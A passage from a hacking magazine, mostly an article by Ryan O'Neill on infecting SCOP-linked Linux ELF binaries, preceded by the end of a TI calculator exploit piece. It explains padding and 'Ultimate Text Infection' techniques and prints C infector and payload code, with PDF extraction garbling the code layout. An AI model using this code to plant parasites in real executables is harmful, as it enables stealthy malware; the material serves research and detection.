only applications are built into the OS, and they put
an LED that blinks during tests or exams in place
of the 2.5mm I/O port.
So how might we hack this thing? Well, the ob-
vious thing is to resort to the original TI-82 hacks,
whose OS even after all these years is still pretty
similar to this one.
RAM backups, perhaps? Well, that’s normally
something that happens over the 2.5mm I/O port,
which we no longer have. But, unbeknownst to most
people, RAM backups actually do work over USB,
sort of. No link software supports it, because we
never really bothered to look, but code to handle it
is implemented in the OS.
I came up with a specially-crafted memory
backup with corrupted Real variables, as well as a
script to transfer this memory backup from a PC,
and it does work, you can get code execution on it
and even unlock Flash.
Then they made a new model, the TI-84 Plus
T, which is just the Silver Edition version of this
TI-82 Advanced, except they removed the backup
functionality from it. So that functionality may dis-
appear soon from the TI-82 Advanced as well, and
we’ll need a new way in.
Where do we go from here?
What’s next? Well, there are still plenty of exploits
to release. Ndless for the TI-Nspire is constantly
being fought by TI, so help is always appreciated
there, and just explained, we need a new method
of privileged code execution for the TI-82 Advanced
that will work on the TI-84 Plus T. That’s kind of
an old school challenge that’s still outstanding, and
I’m sure a clever reader could finish it off with a few
weekends of coding.
And then of course there’s the TI-84 Plus CE
family, where we need to stay on top of new de-
velopments, new hardware revisions, new OS ver-
sions. You never know when TI is going to make a
manufacturing change or an OS update that has a
big impact on the community. More than once I’ve
seen them release OS updates that have very serious
bugs in them that mess up programs that have been
around for decades. If we don’t let them know the
technical details of what went wrong and how to fix
it, who will?
4420:07
Modern ELF Infection Techniques of SCOP Binaries
by Ryan “ElfMaster” O’Neill
With the recent introduction of the SCOP
(Secure COde Partitioning) security mitigation—
otherwise known as the ld -separate-code
feature—there are naturally going to be some
changes in the way ELF segments are parsed. The
feature is thought provoking, and promises interest-
ing developments in how malware authors will work
around it.
In this paper we will discuss potential mecha-
nisms for SCOP infections. We will also explore
philosophies of traditional infection techniques and
discuss a lost technique for shared library injection
via DT_NEEDED. All of the code in this paper uses
libelfmaster for portable design, convenience and
portability. 21
First, a quick primer on SCOP executables be-
fore jumping right into malware techniques.
tions holding relocation, symbol, note, version, and
string data. 23
The developers of ld eventually realized that it
made a lot of sense to add a feature to the linker that
assigns read-only sections into read-only PT_LOAD
segments, and read+execute sections into a single
read+execute PT_LOAD segment. Only four sections
(on average) require execution: typically, these are
.init, .plt, .text, and .fini. This results in an
executable with a text segment that is broken up
into three segments, and reduces the ROP gadget
attack surface.
This is the main idea of SCOP. It seems obvi-
ous in retrospect, and should have happened much
sooner. However, despite the ELF ABI being the
foundation of the binary toolchain, very few people
seem to truly care it, for whatever reason. Through-
out this paper we will explore some further SCOP
nuances that are relevant for infecting SCOP exe-
cutables.
SCOP Primer
A SCOP binary, as explained in “Secure Code Par-
titioning With ELF binaries” by myself and Justin
Michaels, 22 is an ELF executable that has been
linked with the separate-code option supported
by recent versions of ld(1). SCOP binaries are be-
coming the norm on modern Linux OSes, and al-
ready the standard in several distributions such as
Lubuntu 18.
SCOP corrects an old anti-pattern of ELF bina-
ries, which, until recently, was prevalent on mod-
ern systems. Under this legacy anti-pattern, the
.text (code) segment is described by a single PT_-
LOAD segment marked with R+X permissions. There
are many areas within an executable that must be
read-only, such as the .rodata section, but do not
require execution permission. On average, there are
about 18 sections within the text segment, only four
of which require execution. Therefore the remaining
14 sections are executable in memory, though they
only require read access.
An astute security researcher would recognize
that this exposes a larger attack surface of ROP gad-
gets. A quick scan with ROP gadget scanning tools
such as Jonathan Salwan’s ROPgadget will show you
that there are usable gadgets that exist within sec-
Text Segment Layout
Traditional executables consisted of a readable-and-
executable .text, which is not writable, and a
readable-and-writable data segment, which is not
executable.
The read-only data that didn’t require execu-
tion, as explained above, was placed in the text seg-
ment, which was treated as the natural segment for
them, also being read-only. Yet if one gives it a
closer look, it quickly becomes apparent that there
are only four or five sections in the text segment
that actually require execution, and the linker marks
them respectively with the sh_flags value being set
to SHF_ALLOC|SHF_EXECINSTR, whereas the sections
that are read-only are marked as SHF_ALLOC, mean-
ing they are allocated into memory, and that’s it.
Page 46 shows the output of readelf -S on a
traditional 32-bit executable. As we examine only
the sections that are in the text segment, I’ve trun-
cated some of the output.
Notice that only five sections require execution,
the rest are set to SHF_ALLOC (marked A) or, in
the case of .rel.plt, SHF_ALLOC|SHF_INFO_LINK
21 git
clone https://github.com/elfmaster/libelfmaster
pocorgtfo20.pdf scop2018.txt
23 git clone https://github.com/JonathanSalwan/ROPgadget
22 unzip
45[ 0]
[ 1]
[ 2]
[ 3]
[ 4]
[ 5]
[ 6]
[ 7]
[ 8]
[ 9]
[10]
[11]
[12]
[13]
[14]
[15]
[16]
[17]
[18]
. interp
. n o t e . ABI−t a g
. n o t e . gnu . b u i l d −i
. gnu . hash
. dynsym
. dynstr
. gnu . v e r s i o n
. gnu . v e r s i o n _ r
. r e l . dyn
. rel . plt
. init
. plt
. p l t . got
. text
. fini
. rodata
. eh_frame_hdr
. eh_frame
NULL
PROGBITS
NOTE
NOTE
GNU_HASH
DYNSYM
STRTAB
VERSYM
VERNEED
REL
REL
PROGBITS
PROGBITS
PROGBITS
PROGBITS
PROGBITS
PROGBITS
PROGBITS
PROGBITS
00000000
08048154
08048168
08048188
080481 ac
080481 c c
0804822 c
0804827 c
08048288
080482 a8
080482 b0
080482 c8
080482 f 0
08048330
08048340
08048504
08048518
08048528
08048564
000000
000154
000168
000188
0001 ac
0001 c c
00022 c
00027 c
000288
0002 a8
0002 b0
0002 c8
0002 f 0
000330
000340
000504
000518
000528
000564
000000
000013
000020
000024
000020
000060
000050
00000 c
000020
000008
000018
000023
000040
000008
0001 c2
000014
00000 f
00003 c
0000 f c
00
00
00
00
04
10
00
02
00
08
08
00
04
08
00
00
00
00
00
A
A
A
A
A
A
A
A
A
AI
AX
AX
AX
AX
AX
A
A
A
0
0
0
0
5
6
0
5
6
5
5
0
0
0
0
0
0
0
0
0 0
0 1
0 4
0 4
0 4
1 4
0 1
0 2
1 4
0 4
23 4
0 4
0 16
0 8
0 16
0 4
0 4
0 4
0 4
Traditional 32-bit Executable Sections
(marked AI), which indicates that its sh_info mem-
ber links to another section. As a quick reminder
about the ELF format, remember that these sec-
tion permissions are only useful for linking and de-
bugging code, at best, as loaders totally disregard
them and go by the segment permissions instead.
However as, we demonstrated with the parsing sup-
port for SCOP binaries that we recently merged into
libelfmaster, these section headers can be very
useful when heuristically analyzing SCOP binaries
with LOAD segments that have had their p_flags
(Memory permissions) modified with various infec-
tion methods!
While parsing hostile or tampered SCOP bina-
ries, we can compare the sh_flags of allocated sec-
tions with the p_flags of the corresponding PT_-
LOAD segments. If the permissions are consistent
across both sh_flags and p_flags, then the SCOP
binary is very likely untampered. The important
thing to note here is that the section header sh_-
flags directly correlate to how the executable is di-
vided into corresponding segments with equivalent
p_flags.
care about the ABI!
With SCOP binaries, we no longer have the con-
vention of a single LOAD segment for the text im-
age. After all, why store read-only code in an ex-
ecutable region when it may contain ROP gadgets
and other unintended executable code? This was a
smart move by the GNU ld(1) developers.
So a SCOP binary, according to the program
headers, now has four PT_LOAD segments:
0 Text Segment (R)
1 Text Segment (R+X)
2 Text Segment (R)
3 Data Segment (R+W)
Code Injection Techniques
I see several ways to instrument the binary with
a chunk of additional executable code, while still
keeping the ELF headers intact. First, though, let
us mention some of the classic infection techniques
that we can use. These are discussed in great depth
elsewhere, e.g., in my book Learning Linux Binary
Analysis 24 and in Unix ELF Parasites and Virus,
Silvio Cesare 1998. 25
NOTE: The astute reader may realize
that its possible for an attacker to mod-
ify the section header sh_flags to re-
flect the program header p_flags. But,
it seems, even attackers don’t seem to
24 Chapter
25 unzip
4, ELF Virus technology, https://github.com/PacktPublishing/Learning-Linux-Binary-Analysis
pocorgtfo20.pdf elf-pv.txt
46Traditional Text Segment Padding
In a traditional text segment padding infection, the
parasite is simply added to the .text segment—with
a nifty trick.
This infection technique relies on the fact that
the text and data segment are stored flush against
each other on disk, but since the p_vaddr must
be congruent with the p_offset modulo PAGE_-
SIZE, we must first extend the p_filesz/p_-
memsz of the text segment, and then adjust the
p_offsets of the subsequent segments by shift-
ing forward a PAGE_SIZE. 26 Please note that this
does not mean that there will be anywhere close
to 4096 bytes of usable space for the parasite
code; rather, there will be (data[PT_LOAD].p_-
vaddr & ~4095) - (text[PT_LOAD].p_vaddr +
text[PT_LOAD].p_memsz) bytes, which may be a
lot less.
This limitation is more relevant on 32-bit sys-
tems. On x86_64, we can shift the p_offsets that
follow the text segment forward by (parasite_size
+ 4095 & ~4095) bytes, extending further due to
the fact that the x86_64 architecture uses HUGE_-
PAGES for the elfclass64 binaries, which are 0x20-
0000 bytes in size.
This technique was first published by Silvio Ce-
sare. It was a brilliant piece of research that im-
pacted me greatly, inspiring me to delve into the
esoteric world of binary formats. It taught me the
beauty of meticulously modifying their structure
without breaking the format specification that the
kernel requires to be intact, but can also sometimes
interpret in rather strange ways. 27
The following illustration shows a traditional
text segment padding infection on disk.
table on a SCOP binary, we see that similar slack
space chunks arise from the differences between the
file storage and the memory image representations,
and that HUGE_PAGEs are used, allowing for much
larger infection sizes on 64-bit.
LOAD 0 x0000000000000000 0 x0000000000400000
0 x0000000000400000 0 x00000000000004d0
0 x00000000000004d0 R
0 x200000
LOAD 0 x0000000000200000 0 x0000000000600000
0 x0000000000600000 0 x000000000000021d
0 x000000000000021d R E
0 x200000
LOAD 0 x0000000000400000 0 x0000000000800000
0 x0000000000800000 0 x0000000000000148
0 x0000000000000148 R
0 x200000
In /proc/pid/maps, it looks like this.
1 00400000 −00401000 r−−p 00000000 f d : 0 1
00600000 −00601000 r−xp 00200000 f d : 0 1
3 00800000 −00801000 r−−p 00400000 f d : 0 1
The text segment is broken up into three differ-
ent memory mappings. The end of the executable
mapping (PT_LOAD[1]) is at 0x601000. The next
virtual address that starts the third text segment
(PT_LOAD[2]) is at 0x8000000, which leaves quite a
bit of space for infection. For injections that require
even larger arbitrary length infections there are al-
ternative solutions; see my dym_obfuscate project
and the Retaliation Virus, which use PT_NOTE to
PT_LOAD conversions. 28 29
Text segment padding infection in SCOP bi-
naries
1 [ ehdr ] [ phdr ]
[ t e x t : p a r a s i t e _ s i z e _ e x t e n s i o n (R+X) ]
3 [ data (R+W) ]
The algorithm is similar to the original text segment
padding infection, except that all of the phdr->p_-
offsets after the first executable LOAD segment:
PT_LOAD[1] are adjusted instead of all the phdr->-
p_offsets after PT_LOAD[0].
Using an example with libelfmaster, we
demonstrate the algorithm for infecting both the bi-
naries linked with SCOP and the traditionally linked
ones. This example should showcase the algorithm
enough to demonstrate that SCOP binaries can still
be infected with the same historic and brilliant text
Layout of SCOP Program Segments
SCOP no longer sticks all the read-only ELF sec-
tions into the same single executable segment, but
this hardly poses a challenge to the adept binary
hacker. After a brief glance at the program header
26 p_offset
+= 4096
if you are reading this: although the scientometric “impact factor” of these publications may never be calculated,
their passion-inspiring factor is damn hard to beat. Thank you. —PML
28 git clone https://github.com/elfmaster/dsym_obfuscate
29 unzip pocorgtfo20.pdf retaliation.txt
27 Silvio,
47segment padding infection techniques conceived by
Silvio in the Unix ELF Parasites and Virus, by secu-
rity researchers, reverse engineers, virus enthusiasts,
or malware authors.
Although this general type of infection is well-
explored, the difference in approach for SCOP is
subtle enough to warrant a detailed code example
on page 49, to show what a text segment padding
infection would look like. Don’t worry, though—in
section 3.4 we give the source code for a totally new
type of ELF infection that is specific to SCOP bi-
naries.
the second PT_LOAD segment in reverse, but, as we
will see shortly, there is a much better infection tech-
nique for regular and PIE executables when SCOP
is being used.
Before infection:
0 x400000
2 [ e l f _ h d r ] [ phdrs ] [ i n t e r p ]
4 0 x600e10
[ text_segment (R+X) ] [ data_segment (R+W) ]
After infection:
Traditional Reverse Text Padding
The reverse text padding infection technique—of
which the Skeksi virus 30 serves as a good example—
is the combination of the following tricks.
• Subtracting from the text segment’s p_vaddr
by PAGE_ALIGN(parasite_len).
1 0 x3ff000
[ e l f _ h d r ] [ p a r a s i t e ] [ phdrs ] [ i n t e r p ]
3 [ text_segment (R+X) ]
5 0 x600e10
[ data_segment (R+W) ]
• Extending the size of the text segment by
adjusting p_filesz and p_memsz by PAGE_-
ALIGN(parasite_len) bytes.
SCOP Reverse text infections?
SCOP binaries are by convention compiled and
linked as PIE executables, which pretty much pre-
cludes them from this infection type. However, there
is one theoretical idea we could entertain. Instead
of reversing PT_LOAD[0], which has a base address
of 0x0, we could reverse the PT_LOAD[1] segment,
which is the SCOP-separated R+X part of the text
segment’s code in SCOP binaries. With that said,
there is a much better infection method for SCOP
binaries that lends itself very nicely to inserting
large amounts of code into the target binary with-
out having to make any adjustments to the ELF file
headers, as described below.
• Shifting the program header table and interp
segment forward PAGE_ALIGN(parasite_len)
bytes by adjusting p_offset accordingly
• Updating elf_hdr->e_shoff. 31
• Updating the .text section’s offset and ad-
dress to match where the parasite begins. 32 .
Qualities of Reverse Text Padding
The primary benefit of this infection technique is
that it yields a significantly larger amount of space
to inject code in ET_EXEC files. On a 64-bit Linux
system with the standard linker script used, an ex-
ecutable has a text base address of 0x400000, thus
the maximum parasite length would be 0x400000
- PAGE_ALIGN_UP(sizeof(ElfN_Ehdr)) bytes, or
4.1MB of space. It is also favorable for infections be-
cause it allows the modification of e_entry (Entry
point) to point into the .text section, which could
potentially circumvent weak anti-virus heuristics.
The primary disadvantage of this technique is
that it will not work with PIE executables. In the-
ory, it could work with SCOP binaries by extending
Ultimate Text Infection (UTI) for SCOP ELF
Binaries
$ g c c −fPIC −p i e t e s t . c −o t e s t
2 $ g c c −fPIC −p i e −Wl,−z , s e p a r a t e −code \
t e s t . c −o t e s t _ s c o p
4 $ l s −sh t e s t
8 . 1K t e s t
6 $ l s −sh t e s t _ s c o p
4 . 1M t e s t _ s c o p
30 Phrack
61:8, the Cerberus ELF Interface by Mayhem, unzip pocorgtfo20.pdf phrack61-8.txt
+= PAGE_ALIGN(parasite_len)
32 shdr->sh_offset = old_text_base + sizeof(ElfN_Ehdr)
31 elf_hdr->e_shoff
481 struct e l f _ s e g m e n t segment ;
elf_segment_iterator_t p_iter ;
3 elfobj_t obj ;
b o o l r e s , found_text = f a l s e ;
5 u i n t 6 4 _ t text_vaddr , p a r a s i t e _ v a d d r ;
s i z e _ t p a r a s i t e _ s i z e = SOME_VALUE;
7
r e s = e l f _ o p e n _ o b j e c t ( a r g v [ 1 ] , &obj , ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &e r r o r ) ;
9 i f ( r e s == f a l s e ) { . . . }
11 e l f _ s e g m e n t _ i t e r a t o r _ i n i t (& obj , &p _ i t e r ) ;
while ( e l f _ s e g m e n t _ i t e r a t o r _ n e x t (& p _ i t e r , &segment ) != NULL) {
13
i f ( e l f _ f l a g s (& obj , ELF_SCOP_F) == t r u e ) {
/∗ e l f _ e x e c u t a b l e _ t e x t _ b a s e ( ) w i l l r e t u r n t h e v a l u e o f PT_LOAD[ 1 ] s i n c e i t i s
15
∗ t h e p a r t o f t h e t e x t s egm ent s t h a t have e x e c u t a b l e p e r m i s s i o n s .
∗/
i f ( segment . vaddr == ( text_vaddr = e l f _ e x e c u t a b l e _ t e x t _ b a s e (& o b j ) ) ) {
17
struct e l f _ s e g m e n t new_text ;
u i n t 6 4 _ t p a r a s i t e _ v a d d r , old_e_entry , end_of_text ;
19
p a r a s i t e _ v a d d r = segment . vaddr + segment . f i l e s z ;
21
old_e_entry = e l f _ e n t r y _ p o i n t (& o b j ) ;
end_of_text = segment . o f f s e t + segment . f i l e s z ;
23
memcpy(&new_text , &segment , s i z e o f ( segment ) ) ;
new_text . f i l e s z += p a r a s i t e _ s i z e ;
25
new_text . memsz += p a r a s i t e _ s i z e ;
elf_segment_modify (& obj , p _ i t e r . i n d e x − 1 , &new_text , &e r r o r ) ;
27
found_text = t r u e ;
} e l s e { /∗ I f t h i s i s n o t a SCOP b i n a r y t h e n we j u s t l o o k f o r t h e t e x t segment by f i n d i n g
29
∗ t h e f i r s t PT_LOAD a t a minimum ∗/
i f ( segment . o f f s e t == 0 && segment . t y p e == PT_LOAD) {
31
struct e l f _ s e g m e n t new_text ;
u i n t 6 4 _ t p a r a s i t e _ v a d d r , old_e_entry , end_of_text ;
33
text_vaddr = segment . vaddr ;
35
p a r a s i t e _ v a d d r = segment . vaddr + segment . f i l e s z ;
old_e_entry = e l f _ e n t r y _ p o i n t (& o b j ) ;
37
end_of_text = segment . o f f s e t + segment . f i l e s z ;
memcpy(&new_text , &segment , s i z e o f ( segment ) ) ;
39
new_text . f i l e s z += p a r a s i t e _ s i z e ;
new_text . memsz += p a r a s i t e _ s i z e ;
41
elf_segment_modify (& obj , p _ i t e r . i n d e x − 1 , &new_text , &e r r o r ) ;
found_text = t r u e ;
43
}
}
45
i f ( found_text == t r u e && segment . vaddr > text_vaddr ) {
/∗ I f we have found t h e t e x t segment , t h e n we must a d j u s t
47
∗ t h e s u b s e q u e n t segment ’ s p _ o f f s e t ’ s . ∗/
struct e l f _ s e g m e n t new_segment ;
49
memcpy(&new_segment , &segment , s i z e o f ( segment ) ) ;
new_segment . o f f s e t += ( p a r a s i t e _ s i z e + ( (PAGE_SIZE − 1 ) & ~(PAGE_SIZE − 1 ) ) ;
51
elf_segment_modify (& obj , p _ i t e r . i n d e x − 1 , &new_segment , &e r r o r ) ;
}
53
ehdr−>e_entry = p a r a s i t e _ v a d d r ;
/∗ Then o f c o u r s e you must a d j u s t ehdr−>e _ s h o f f a c c o r d i n g l y
55
∗ and ehdr−>e_entry can p o i n t t o your p a r a s i t e code . ∗/
}
SCOP Text Segment Padding Infection
49Notice that there is an enormous difference in
file size between these two executables test and
test_scop, which contain approximately the same
amount of code and data. In our original write-up
for SCOP, we hadn’t addressed this, but it is an im-
portant detail that appears to conveniently provide
plenty of playroom for virus authors and other bi-
nary hackers who’d want to instrument or modify an
ELF binary in some arbitrary way. Whether or not
this was an oversight by the ld(1) developers, I am
not entirely sure, but I haven’t yet found a reason
to justify this particular design choice.
Why is the test_scop is so much larger than
test? This appears to be because SCOP binaries
have p_offsets that are identical to their p_vaddrs
for the first three load segments. This is not neces-
sary, because the only requirement for an executable
segment to load correctly is that its p_vaddr and
p_offset must be congruent modulo a PAGE_SIZE.
Looking at the first three PT_LOAD segments we can
see that there is a vast amount of space on-disk be-
tween the first and the second segments, and be-
tween the second and the third segments. The sec-
ond segment is R+X, so this is ideally the one we’d
want to use. In the test_scop binary, the second
PT_LOAD segment has a p_filesz of 0x24d (589 dec-
imal) bytes. The offset of the third segment is at
0x400000.
This means that we have an injection space
available to us that can be calculated by PT_-
LOAD[2].p_offset - PT_LOAD[1].p_offset +
PT_LOAD[1].p_filesz. For the test_scop binary
this results in 2,096,563 bytes of padding length.
This is an unusually large code cave for ELF binary
types.
As it turns out, the SCOP binary mitigation not
only helps tighten down the ROP gadget regions,
but also actually eases the process of inserting code
into the executable!
The SCOP Ultimate Text Infection (UTI) Al-
gorithm
• Insert code into file at PT_LOAD[1].p_offset
+ PT_LOAD[1].p_filesz.
• Backup original PT_LOAD[1].p_filesz:
size_t o_filesz = PT_LOAD[1].p_filesz;
• Adjust
length
PT_LOAD[1].p_filesz += code_-
• Adjust PT_LOAD[1].p_memsz += code_length
• Modify
ehdr->e_entry to point
PT_LOAD[1].p_vaddr + o_filesz
at
• In our case, egg.c contains PIC code for jump-
ing back to the original entry point which
changes at runtime due to ASLR.
Note on resolving Elf_Hdr->e_entry in PIE
executables
If the target executable is PIE, then the parasite
code must be able to calculate the original entry
point address in certain circumstances: primarily,
when the branch instruction used requires an abso-
lute address. The Elf_hdr->e_entry will change
at runtime once the kernel has randomly relocated
the executable by an arbitrary address space dis-
placement. Our parasite code egg.c on page 51 has
its text and data segment merged into one PT_LOAD
segment, which allows for easy access to the data
segment with position independent code. The egg
has two variables that are initialized and therefore
stored in the .data section. (Explicitly not the .bss
section!) We have the following two unsigned global
integers:
s t a t i c unsigned long o_entry
__attribute__ ( ( s e c t i o n ( " . data " ) ) )
= {0 x00 } ;
s t a t i c unsigned long vaddr_of_get_rip
__attribute__ ( ( s e c t i o n ( " . data " ) ) )
= {0 x00 } ;
1 [ e l f _ h d r ] [ phdrs ]
3 PT_LOAD [ 0 ] :
[ text rdonly ]
5
PT_LOAD [ 1 ] :
7 [ t e x t rd+e x e c ] [ t e x t −p a r a s i t e ]
9 PT_LOAD [ 2 ] :
[ text rdonly ]
11
PT_LOAD [ 3 ] :
13 [ data ]
502
4
6
8
10
12
14
/∗ e g g . c
∗
∗ scop_infect . c w i l l patch t h e s e i n i t i a l i z e d . data
∗ s e c t i o n v a r i a b l e s . We i n i t i a l i z e them so t h a t
∗ t h e y do n o t g e t s t o r e d i n t o t h e . b s s which i s
∗ non−e x i s t e n t on d i s k . We p a t c h t h e v a r i a b l e s w i t h
∗ w i t h t h e v a l u e o f e_entry , and t h e a d d r e s s o f where
∗ the get_rip () function gets i n j e c t e d into the t a r g e t
∗ b i n a r y . These a r e t h e n s u b t r a c t e d from e a c h o t h e r and
∗ from t h e i n s t r u c t i o n p o i n t e r t o g e t t h e c o r r e c t
∗ a d d r e s s t o jump t o .
∗/
s t a t i c unsigned long o_entry __attribute__ ( ( s e c t i o n ( " . data " ) ) ) = {0 x00 } ;
s t a t i c unsigned long vaddr_of_get_rip __attribute__ ( ( s e c t i o n ( " . data " ) ) ) = {0 x00 } ;
16 unsigned long g e t _ r i p ( void ) ;
18 extern long g e t _ r i p _ l a b e l ;
extern long r e a l _ s t a r t ;
20
/∗
22 ∗ Code t o jump b a c k t o e n t r y p o i n t
∗/
24 i n t v o l a t i l e _ s t a r t ( ) {
/∗
26
∗ What we a r e d o i n g e s s e n t i a l l y :
∗ s i z e _ t d e l t a = &g e t _ r i p _ i n j e c t e d _ c o d e − o r i g i n a l _ e n t r y _ p o i n t ;
28
∗ r e l o c a t e d _ e n t r y _ p o i n t = %r i p − d e l t a ;
∗/
30
unsigned long n_entry = g e t _ r i p ( ) − ( vaddr_of_get_rip − o_entry ) ;
32
34
__asm__ v o l a t i l e (
"movq %0, %%rbx \n"
"jmpq ∗%0" : : " g " ( n_entry )
);
36 }
38 unsigned long g e t _ r i p ( void )
{
40
long r e t ;
__asm__ __volatile__
42
(
" c a l l g e t _ r i p _ l a b e l \n"
44
" . g l o b l g e t _ r i p _ l a b e l \n"
" get_rip_label :
\n"
46
" pop %%r a x
\n"
"mov %%rax , %0" : "=r " ( r e t )
48
);
50 }
51/∗ A b b r e v i a t e d s c o p _ i n f e c t . c .
Unzip p o c o r g t f o 2 0 . p d f s c o p . z i p f o r t h e f u l l copy . ∗/
2
#include " / opt / e l f m a s t e r / i n c l u d e / l i b e l f m a s t e r . h"
4
#define PAGE_ALIGN_UP( x ) ( ( x + 4 0 9 5 ) & ~4095)
6 #define PAGE_ALIGN( x ) ( x & ~4095)
#define TMP " . xyzzy "
8
s i z e _ t code_len = 0 ;
10 s t a t i c u i n t 8 _ t ∗ code = NULL;
12 b o o l
patch_payload ( const char ∗ path , e l f o b j _ t ∗ t a r g e t , e l f o b j _ t ∗ egg , u i n t 6 4 _ t i n j e c t i o n _ v a d d r ) {
14
elf_error_t error ;
struct e l f _ s y m b o l get_rip_symbol , symbol , r e a l _ s t a r t _ s y m b o l ;
16
struct e l f _ s e c t i o n s e c t i o n ;
uint8_t ∗ ptr ;
18
size_t delta ;
20
e l f _ o p e n _ o b j e c t ( path , egg , ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &e r r o r ) ;
elf_symbol_by_name ( egg , " g e t _ r i p " , &get_rip_symbol ) ;
elf_symbol_by_name ( egg , " _ s t a r t " , &r e a l _ s t a r t _ s y m b o l ) ;
22
d e l t a = get_rip_symbol . v a l u e − r e a l _ s t a r t _ s y m b o l . v a l u e ;
i n j e c t i o n _ v a d d r += d e l t a ;
24
26
elf_symbol_by_name ( egg , " vaddr_of_get_rip " , &symbol ) ;
p t r = e l f _ a d d r e s s _ p o i n t e r ( egg , symbol . v a l u e ) ;
∗ ( u i n t 6 4 _ t ∗ )&p t r [ 0 ] = i n j e c t i o n _ v a d d r ;
elf_symbol_by_name ( egg , " o_entry " , &symbol ) ;
p t r = e l f _ a d d r e s s _ p o i n t e r ( egg , symbol . v a l u e ) ;
∗ ( u i n t 6 4 _ t ∗ )&p t r [ 0 ] = e l f _ e n t r y _ p o i n t ( t a r g e t ) ;
28
30
32
34
return t r u e ;
}
36
38
40
42
44
46
48
50
52
54
56
58
60
62
i n t main ( i n t a r g c , char ∗∗ a r g v ) {
int fd ;
elfobj_t elfobj ;
elf_error_t error ;
struct e l f _ s e g m e n t segment ;
elf_segment_iterator_t p_iter ;
s i z e _ t o _ f i l e s z , code_len ;
u i n t 6 4 _ t t e x t _ o f f s e t , text_vaddr ;
ssize_t ret ;
elf_section_iterator_t s_iter ;
struct e l f _ s e c t i o n s_entry ;
struct e l f _ s y m b o l symbol ;
uint64_t e g g _ s t a r t _ o f f s e t ;
elfobj_t eggobj ;
uint8_t ∗ eggptr ;
size_t eggsiz ;
i f ( argc < 2) {
p r i n t f ( " Usage : %s <SCOP_ELF_BINARY>\n" , a r g v [ 0 ] ) ;
e x i t (EXIT_SUCCESS) ;
}
e l f _ o p e n _ o b j e c t ( a r g v [ 1 ] , &e l f o b j , ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &e r r o r ) ;
i f ( e l f _ f l a g s (& e l f o b j , ELF_SCOP_F) == f a l s e ) { . . . } // Not a SCOP b i n a r y .
e l f _ s e g m e n t _ i t e r a t o r _ i n i t (& e l f o b j , &p _ i t e r ) ;
while ( e l f _ s e g m e n t _ i t e r a t o r _ n e x t (& p _ i t e r , &segment ) == ELF_ITER_OK) {
i f ( segment . t y p e == PT_LOAD && segment . f l a g s == (PF_R|PF_X) ) {
struct e l f _ s e g m e n t s ;
64
5266
68
70
72
74
76
78
80
82
t e x t _ o f f s e t = segment . o f f s e t ;
o _ f i l e s z = segment . f i l e s z ;
memcpy(&s , &segment , s i z e o f ( s ) ) ;
s . f i l e s z += s i z e o f ( code ) ;
s . memsz += s i z e o f ( code ) ;
text_vaddr = segment . vaddr ;
i f ( elf_segment_modify (& e l f o b j , p _ i t e r . i n d e x − 1 , &s , &e r r o r ) == f a l s e ) {
f p r i n t f ( " s t d e r r , segment_segment_modify ( ) : %s \n" ,
e l f _ e r r o r _ m s g (& e r r o r ) ) ;
e x i t (EXIT_FAILURE) ;
}
break ;
}
}
/∗ Patch . / e g g so t h a t i t s two g l o b a l v a r i a b l e s o_entry and vaddr_of_get_rip a r e s e t t o
∗ t h e o r i g i n a l e n t r y p o i n t o f t h e t a r g e t e x e c u t a b l e , and t h e a d d r e s s o f where w i t h i n
∗ t h a t e x e c u t a b l e t h e g e t _ r i p ( ) f u n c t i o n w i l l be i n j e c t e d .
∗/
patch_payload ( " . / egg " , &e l f o b j , &e g g o b j , t e x t _ o f f s e t + o _ f i l e s z ) ;
84
86
88
90
92
/∗ NOTE We must u s e PAGE_ALIGN on e l f _ t e x t _ b a s e ( ) b e c a u s e i t ’ s PT_LOAD i s a merged t e x t
∗ and d a t a segment , which r e s u l t s i n h a v i n g a p _ o f f s e t l a r g e r than 0 , even t h o u g h t h e
∗ i n i t i a l ELF f i l e h e a d e r a c t u a l l y s t a r t s a t o f f s e t 0 . Check o u t ’ g c c −N − n o s t d l i b
∗ − s t a t i c code . c −o code ’ and examine phdr ’ s e t c . t o u n d e r s t a n d what I mean .
∗/
elf_symbol_by_name(& e g g o b j , " _ s t a r t " , &symbol ) ;
e g g _ s t a r t _ o f f s e t = symbol . v a l u e − PAGE_ALIGN( e l f _ t e x t _ b a s e (& e g g o b j ) ) ;
e g g p t r = e l f _ o f f s e t _ p o i n t e r (& e g g o b j , e g g _ s t a r t _ o f f s e t ) ;
e g g s i z = e l f _ s i z e (& e g g o b j ) − e g g _ s t a r t _ o f f s e t ;
94
96
98
100
102
104
106
108
110
switch ( e l f _ c l a s s (& e l f o b j ) ) {
case e l f c l a s s 3 2 :
e l f o b j . ehdr32−>e_entry = text_vaddr + o _ f i l e s z ;
break ;
case e l f c l a s s 6 4 :
e l f o b j . ehdr64−>e_entry = text_vaddr + o _ f i l e s z ;
break ;
}
/∗ Extend t h e s i z e o f t h e s e c t i o n t h a t t h e p a r a s i t e code ends up i n . ∗/
e l f _ s e c t i o n _ i t e r a t o r _ i n i t (& e l f o b j , &s _ i t e r ) ;
while ( e l f _ s e c t i o n _ i t e r a t o r _ n e x t (& s _ i t e r , &s_entry ) == ELF_ITER_OK) {
i f ( s_entry . s i z e + s_entry . a d d r e s s == text_vaddr + o _ f i l e s z ) {
s_entry . s i z e += e g g s i z ;
e l f _ s e c t i o n _ m o d i f y (& e l f o b j , s _ i t e r . i n d e x − 1 , &s_entry , &e r r o r ) ;
}
}
e l f _ s e c t i o n _ c o m m i t (& e l f o b j ) ;
112
114
116
118
120
122
124
126
f d = open (TMP, O_RDWR|O_CREAT|O_TRUNC, 0 7 7 7 ) ;
r e t = w r i t e ( fd , e l f o b j . mem, t e x t _ o f f s e t + o _ f i l e s z ) ;
r e t = w r i t e ( fd , e g g p t r , e g g s i z ) ;
r e t = w r i t e ( fd , &e l f o b j .mem[ t e x t _ o f f s e t + o _ f i l e s z + e g g s i z ] ,
e l f _ s i z e (& e l f o b j ) − t e x t _ o f f s e t + o _ f i l e s z + e g g s i z ) ;
i f ( r e t < 0) {
perror (" write ") ;
goto done ;
}
done :
c l o s e ( fd ) ;
rename (TMP, elf_pathname(& e l f o b j ) ) ;
e l f _ c l o s e _ o b j e c t (& e l f o b j ) ;
}
53ERESI uses for DT_NEEDED infection, but I imagine
it is very similar to how dt_infect works.
During the injection of egg into the target binary,
we load o_entry with the value of Elf_hdr->e_-
entry, which is an address into the PIE executable,
and will be changed at runtime. We load vaddr_-
of_get_rip with the address of where we injected
the get_rip() function from ./egg into the tar-
